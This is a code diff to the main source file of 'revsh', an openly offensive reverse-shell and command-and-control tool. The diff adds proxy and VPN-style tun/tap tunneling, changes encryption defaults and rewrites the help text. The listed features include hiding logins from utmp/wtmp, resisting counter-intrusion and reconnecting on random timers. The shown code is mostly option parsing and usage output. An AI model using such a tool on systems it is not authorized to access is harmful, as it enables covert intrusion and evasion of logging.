@@ -10,11 +10,12 @@
  * 2013-07-17: Original release.
  * 2014-08-22: Complete overhaul w/SSL support.
  * 2015-01-16: YACO (Yet another complete overhaul.) Added the internal messaging interface.
+ * 2016-08-27: YACO (Yet another complete overhaul.) Added proxies and tun/tap support.
  *
  *
  * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
- * designed to establish a remote shell with terminal support. This isn't intended as a replacement for netcat, but
- * rather as a supplementary tool to ease remote interaction during long engagements.
+ * designed to establish a remote shell with terminal support as well as full reverse vpn style tunneling..
+ * revsh isn't intended as a replacement for netcat, but rather as a supplementary tool. 
  *
  *
  * Features:
@@ -26,12 +27,15 @@
  *		* Circumvent utmp / wtmp. (No login recorded.)
  *		* Process rc file commands upon login.
  *		* OpenSSL encryption with key based authentication baked into the binary.
- *		* Anonymous Diffie-Hellman encryption upon request.
- *		* Ephemeral Diffie-Hellman encryption as default.
+ *		* Anonymous Diffie-Hellman encryption as default
+ *		* Ephemeral Diffie-Hellman encryption on request.
  *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
  *		* Connection timeout for remote process self-termination.
  *		* Randomized retry timers for non-predictable auto-reconnection.
  *		* Non-interactive mode for transfering files.
+ *		* Proxy support: point-to-point, socks4, socks4a, socks5
+ *			(Note: Only the "TCP Connect" subset of the socks protocol is supported.)
+ *		* TUN / TAP support
  *
  **********************************************************************************************************************/
 
@@ -56,13 +60,41 @@ volatile sig_atomic_t sig_found = 0;
  * Purpose: Educate the user as to the error of their ways.
  *
  **********************************************************************************************************************/
-// XXX add -vv support by making verbose a counter.
-void usage(){
+
+// XXX
+// Remove -a switch. 
+// -e : ephemeral dh.
+//		Add check for #ifdef GENERIC_BUILD that sets default to ADH and prints a friendly error message if c2 invoked w/-e.
+// -v : handle multpiles for counter of verbosity.
+// -H : long usage (the old one). 
+// -h : simple usage (a new one).
+// -l : same thing as -c
+// -w : Disable default proxy.  (Just set config->socks to NULL.)
+// -x : Disable default tun.
+// -y : Disable default tap.
+
+void usage(int ret_code){
+	fprintf(stderr, "\n");
+	fprintf(stderr, "C2 usage:\t%s -c [-b] [-v] [-h] [-H] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(stderr, "Target usage:\t%s    [-b] [-v]           [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(stderr, "\n");
+	fprintf(stderr, "\t-c\t\tRun as a command and control listener.\n");
+	fprintf(stderr, "\t-b\t\tBind shell mode. Must be specified on both ends.\n");
+	fprintf(stderr, "\t-v\t\tVerbose error reporting.\n");
+	fprintf(stderr, "\t-h\t\tPrint this short help with common options.\n");
+	fprintf(stderr, "\t-H\t\tPrint a much longer help with all options.\n");
+	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the C2 listener.\t(Default is \"%s\".)\n", ADDRESS);
+	fprintf(stderr, "\n");
+	exit(ret_code);
+}
+
+void usage_long(int ret_code){
 #ifdef OPENSSL
 	fprintf(stderr, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-z LOG_FILE] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
 #else /* OPENSSL */
 	fprintf(stderr, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2] [-z LOG_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
 #endif /* OPENSSL */
+
 	fprintf(stderr, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
 #ifdef OPENSSL
 	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
@@ -80,8 +112,8 @@ void usage(){
 	fprintf(stderr, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(No default set.)\n");
 #endif
 	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
+	fprintf(stderr, "\t-k\t\tRun in keep-alive mode.\n\t\t\tOnly valid in bind shell mode.\n");
 	fprintf(stderr, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
-	fprintf(stderr, "\t-k\t\tRun in keep-alive mode.\n");
 	fprintf(stderr, "\t-v\t\tVerbose output.\n");
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
 	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
@@ -97,7 +129,7 @@ void usage(){
 	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
 	fprintf(stderr, "\n\n");
 
-	exit(-1);
+	exit(ret_code);
 }
 
 
@@ -170,6 +202,7 @@ int main(int argc, char **argv){
 	// XXX Add opts for these when redoing the opts.
 	config->tun = 1;
 	config->tap = 1;
+	config->socks = SOCKS_LISTENER;
 
 #ifdef NOP
 	config->nop = 1;
@@ -185,7 +218,8 @@ int main(int argc, char **argv){
 #ifdef OPENSSL
 	io->fingerprint_type = NULL;
 
-	config->encryption = EDH;
+	//config->encryption = EDH;
+	config->encryption = ADH;
 	config->cipher_list = NULL;
 #endif /* OPENSSL */
 
@@ -199,8 +233,16 @@ int main(int argc, char **argv){
 	}
 
 	/* Grab the configuration from the command line. */
-	while((opt = getopt(argc, argv, "pbkacs:d:f:L:R:D:r:z:ht:nv")) != -1){
+	while((opt = getopt(argc, argv, "hHpbkacs:d:f:L:R:D:r:z:t:nv")) != -1){
 		switch(opt){
+
+			case 'h':
+				usage(0);
+				break;
+
+			case 'H':
+				usage_long(0);
+				break;
 
 			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
 			/*  You will need to pass the -p switch from both ends in order for it to work. */
@@ -283,9 +325,8 @@ int main(int argc, char **argv){
 				verbose = 1;
 				break;
 
-			case 'h':
 			default:
-				usage();
+				usage(-1);
 		}
 	}
 
@@ -307,7 +348,7 @@ int main(int argc, char **argv){
 	}else if((argc - optind) == 0){
 		config->ip_addr = ADDRESS;
 	}else{
-		usage();
+		usage(-1);
 	}
 
 	if(io->controller){
